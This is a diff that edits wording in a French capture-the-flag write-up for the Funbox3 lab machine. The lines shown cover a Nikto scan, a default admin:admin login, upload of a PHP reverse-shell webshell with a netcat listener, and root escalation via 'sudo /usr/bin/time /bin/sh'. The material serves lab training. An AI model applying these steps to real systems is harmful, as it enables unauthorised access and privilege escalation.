@@ -30,14 +30,14 @@ PORT      STATE SERVICE VERSION
 
 On a un serveur **SSH** sur le port **22** , un serveur **Apache 2** sur le port **80** et un serveur **MySQL** sur le port **33060**.
 
-Astuce vous pouvez ajouter le domaine _funbox3.home_ dans le fichier `/etc/hosts` avec **Vim** (ou un autre éditeur de texte).
+Astuce : vous pouvez ajouter le domaine _funbox3.home_ dans le fichier `/etc/hosts` avec **Vim** (ou un autre éditeur de texte).
 
 ```bash
 $ sudo vim /etc/hosts
 192.168.1.58    funbox3.home
 ```
 
-Scannons le port **80** avec **Nikto**.
+Scannons le port **80** avec **Nikto** pour avoir d'eventuelles informations sur la sécurité du serveur.
 
 ```bash
 $ nikto -h http://$IP -o nikto.txt
@@ -57,7 +57,7 @@ $ nikto -h http://$IP -o nikto.txt
 + OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
 ```
 
-Sur la page [/store](http://funbox3.home/store) en bas y a un lien "Admin login" qui amène sur [/store/admin.php](http://funbox3.home/store/admin.php) et en essayant avec "admin:admin", ça passe du premier coup. En cliquant sur "Add new book", on peut uploader un fichier quelconque. On prépare donc un webshell en PHP.
+Sur la page [/store](http://funbox3.home/store), en bas il y a un lien "Admin login" qui amène sur [/store/admin.php](http://funbox3.home/store/admin.php) et en essayant avec "admin:admin", ça passe du premier coup. En cliquant sur "Add new book", on peut uploader un fichier quelconque. On prépare donc un webshell en PHP.
 
 ```bash
 $ cp /usr/share/webshells/php/php-reverse-shell.php .
@@ -65,9 +65,9 @@ $ vim php-reverse-shell.php
 /$ip
 ```
 
-On peut lancer un serveur **Netcat** sur le port **1234** (ou celui de votre choix) `nc -lnvp 1234`.
+Puis on lance un serveur **Netcat** sur le port **1234** (ou celui de votre choix) `nc -lnvp 1234`.
 
-En cherchant où les fichiers sont uploadés, on trouve le lien du répertoire [/store/bootstrap/img](http://funbox3.home/store/bootstrap/img). On clique sur notre webshell.
+En cherchant où les fichiers sont uploadés, on trouve le lien du répertoire [/store/bootstrap/img](http://funbox3.home/store/bootstrap/img). On clique sur notre webshell afin de l'exécuter.
 
 ## Pénétration
 
@@ -115,7 +115,7 @@ User tony may run the following commands on funbox3:
 /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
 ```
 
-Sur [GTFOBins](https://gtfobins.github.io/gtfobins/time/#sudo), on regarde comment utiliser "time" en tant que "sudo".
+Sur [GTFOBins](https://gtfobins.github.io/gtfobins/time/#sudo), on regarde quelle commande permet d'utiliser la commande "time" en tant que "sudo" dans le terminal.
 
 ```bash
 sudo /usr/bin/time /bin/sh
